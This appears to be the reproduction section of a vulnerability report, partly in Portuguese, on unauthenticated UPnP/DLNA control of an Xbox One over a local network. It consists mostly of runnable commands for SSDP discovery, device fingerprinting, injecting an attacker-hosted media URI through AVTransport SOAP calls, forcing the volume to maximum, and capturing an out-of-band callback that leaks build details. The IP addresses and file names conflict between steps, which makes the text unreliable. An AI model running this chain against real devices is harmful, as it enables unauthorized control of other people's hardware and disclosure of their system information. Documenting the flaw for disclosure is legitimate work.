
### **Steps to Reproduce (Full Attack Chain & Hardware Recon)**

**1. Environment Setup**
* **Attacker:** A machine on the same LAN (IP: `http://192.168.1.18:8080/hacked.mp4`).
* **Target:** Xbox One console (IP: `192.168.1.19`) with port `2869/TCP` exposed.
* **Payload Hosting:** Start a listener to host the media and capture the incoming OOB (Out-of-Band) request:
  ```bash
  python3 -m http.server 8080
  ```

1. primeiro passo fazer o multicast e emiti o m-searcg para encontrar o dispositivo na rede.

```python
python3 -c "
import socket
msg = 'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:upnp:rootdevice\r\nMX:3\r\nMAN:\"ssdp:discover\"\r\n\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(msg.encode(), ('239.255.255.250', 1900))
s.settimeout(3)
try:
    while True:
        data, addr = s.recvfrom(1024)
        if addr[0] == '192.168.1.19': # substitua pelo IP do dispositivo que deseja encontrar
            response = data.decode()
            for line in response.split('\r\n'):
                if 'USN' in line or 'Location' in line or 'location' in line:
                    print(line)
            print('---')
except: pass
"
```



**2. Automated Discovery & Information Disclosure**
Query the Device Description Document (DDD) to extract the **Unique Device Name (UDN)** and system identifiers:
```bash
curl -s http://192.168.1.19:2869/upnphost/udhisapi.dll?description

curl -v "http://192.168.1.19:2869/upnphost/udhisapi.dll?content=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08"

```
* **Result:** Attacker obtains the UUID needed for targeted SOAP actions and confirms the device is an Xbox One.

**3. Hardware Capabilities Extraction (ConnectionManager)**
Before the injection, query the device for all supported media profiles and protocols:
```bash
curl -X POST "http://192.168.1.19:2869/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:ConnectionManager" \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:ConnectionManager:1#GetProtocolInfo"' \
  -H "Content-Type: text/xml" \
  -d '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:GetProtocolInfo xmlns:u="urn:schemas-upnp-org:service:ConnectionManager:1"/></s:Body></s:Envelope>'
```
* **Result:** Disclosure of 200+ MIME types and DLNA profiles, providing a complete fingerprint of the console's media parsing surface.

**4. Unauthorized Media Injection & App Escape (AVTransport)**
Inject the malicious URI and trigger execution to preempt the foreground application:
* **Action A (SetURI):**
    ```bash
    curl -X POST "http://192.168.1.19:2869/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:AVTransport" \
      -H 'SOAPAction: "urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI"' \
      -H "Content-Type: text/xml" \
      -d '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1"><InstanceID>0</InstanceID><CurrentURI>http://192.168.1.23:8080/hacked.mp4</CurrentURI><CurrentURIMetaData></CurrentURIMetaData></u:SetAVTransportURI></s:Body></s:Envelope>'
    ```
* **Action B (Play):**
    ```bash
    curl -X POST "http://192.168.1.19:2869/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:AVTransport" \
      -H 'SOAPAction: "urn:schemas-upnp-org:service:AVTransport:1#Play"' \
      -H "Content-Type: text/xml" \
      -d '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:Play xmlns:u="urn:schemas-upnp-org:service:AVTransport:1"><InstanceID>0</InstanceID><Speed>1</Speed></u:Play></s:Body></s:Envelope>'
    ```

**5. Hardware Manipulation (RenderingControl)**
Force the system volume to 100% to demonstrate unauthorized hardware control:
```bash
curl -X POST "http://192.168.1.19:2869/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:RenderingControl" \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:RenderingControl:1#SetVolume"' \
  -H "Content-Type: text/xml" \
  -d '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:SetVolume xmlns:u="urn:schemas-upnp-org:service:RenderingControl:1"><InstanceID>0</InstanceID><Channel>Master</Channel><DesiredVolume>100</DesiredVolume></u:SetVolume></s:Body></s:Envelope>'
```

**6. Verification of Data Leakage (OOB Callback)**
Check the Python server logs. The Xbox will have initiated a `GET` request:
* **Log Entry Example:** `192.168.1.29 - - [27/Apr/2026] "GET /exploit.mp4 HTTP/1.1" 200 -`
* **User-Agent Analysis:** The request header discloses the specific **Windows Kernel and Xbox Build version** to the attacker.
